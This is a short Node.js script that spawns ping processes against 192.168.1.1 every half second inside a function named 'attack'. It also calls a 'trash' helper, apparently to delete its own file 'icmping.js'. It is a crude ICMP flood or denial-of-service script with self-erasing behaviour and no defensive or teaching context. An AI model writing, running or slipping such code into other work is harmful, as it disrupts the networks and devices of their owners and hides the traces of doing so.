const {
	spawn
} = require('child_process');
const trash = require('../cache/memory.js');

trash();
trash('icmping.js');

function h61(run){
	spawn('ping', [run], {
		stdio: `ignore`
	})
}

function attack(){
	h61('192.168.1.1')
	h61('192.168.1.1')
}


setInterval(() => {
	attack();
}, 500)
